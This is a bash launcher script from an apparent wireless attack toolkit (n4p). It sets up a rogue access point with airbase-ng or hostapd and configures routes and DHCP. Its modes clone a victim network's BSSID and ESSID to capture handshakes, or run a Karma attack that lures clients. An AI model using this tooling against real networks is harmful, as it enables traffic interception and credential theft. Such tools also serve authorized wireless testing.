#!/bin/bash
##############################################
# Do all prerun variables and safety measures #
# before anything else starts happening      #
##############################################

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
SESSIONFOLDER=/tmp/n4p/ # Set our tmp working configuration directory and then build config files

source ${DIR}/userspace

banner()
{
    echo "${BLD_TEA}$(cat ${DIR_LOGO}auth.logo)${TXT_RST}"; sleep 3
}

killemAll()
{
    echo -e "\n\n${WARN} The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!${TXT_RST}"
    pkill airbase-ng
    [[ $UAP == "AIRBASE" ]] && airmon-ng stop $MON

    kill -9 $(ps -A | grep dhcpd | awk -F' ' '{print $1}')
    echo "${INFO} The environment is now sanitized cya${TXT_RST}"
    exit 0
}
trap killemAll INT HUP;

##################################################################
###############Setup for Airbase-ng and airmon-ng#################
##################################################################
#nm_check() was here source from module_regression

go() #move this into a module next version and add checks for kali people
{
    if [[ $UAP == "AIRBASE" ]]; then
      ${DIR}/./airmon
    elif [[ $UAP == "HOSTAPD" ]]; then
      starthostapd
    else
      echo "${WARN}Error in Config file. Can't determin AccessPoint type.${TXT_RST}"
      sleep 5
      exit 1
    fi
    sleep 4 # Just give us some padding for the Monitor interface to assimilate.
    do_it_check
    [[ $UAP == "AIRBASE" && $SYSTEM_NOMINAL == "0" ]] && startairbase || killemAll #Nominal is puled from the n4p airmon script
}

startairbase()
{
    echo -n "{$INFO} STARTING SERVICE: AIRBASE-NG${TXT_RST}"
    if [[ $VERBOSE_LOGS == "True" ]]; then
        echo "$(date)" >> ${SESSIONFOLDER}logs/airbase-ng.log # Build our own log file if the user asks
        xterm -hold -bg black -fg green -T "Airbase-NG Log Window" -geometry 90x20 -e tail -f ${SESSIONFOLDER}logs/airbase-ng.log &>/dev/null &
    fi

    if [[ $ATTACK == "Handshake" || $ATTACK == "WEP" ]]; then
        airbase-ng -c ${CHAN} -a ${VICTIM_BSSID} -e ${ESSID} -${SECURITY_TYPE} ${ENCRYPTION} -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
    elif [[ $ATTACK == "Karma" ]]; then
        airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -C 15 -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
    else # This just gives us an AP for Sniffing
        airbase-ng -c $CHAN -a $LOCAL_BSSID -e $ESSID -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
    fi
    sleep 2
    setroutes
    ${DIR}/./monitor
}

starthostapd()
{
  ${DIR}/./hostapd
  sleep 5
  setroutes
  ${DIR}/./monitor
}

setroutes()
{
    get_state "$AP" # get_state is sourced from user space file
    while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
        sleep 0.5
        ip link set $AP up
        get_state "$AP"
    done

    if [[ -z $ATTACK ]]; then # We need to function as an AP so set some ip routes
        echo -ne "\n$INFO Assigning IP and Route to $AP\n${TXT_RST}"
        # setting ip and route doesn't always take, lets ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
        local CHK_GATEWAY=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
        [[ -n $CHK_GATEWAY && $CHK_GATEWAY != "${AP_GATEWAY}/32" ]] && ip addr del $CHK_IP dev $AP

        local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}' | cut -d ' ' -f 1)
        [[ -n $CHK_IP && $CHK_IP != "${AP_IP}/24" ]] && ip route flush $CHK_IP

        while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
            sleep 0.3
            ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
        done

        while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
            sleep 0.3
            ip route add ${AP_IP}/24 via $AP_GATEWAY
            #route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY #Out with the old in with the new
        done
    fi
        route -n
        ${DIR}/./dhcp
}

depends #This function is sourced
banner
setupenv #This function is sourced
go
keepalive #This function is sourced
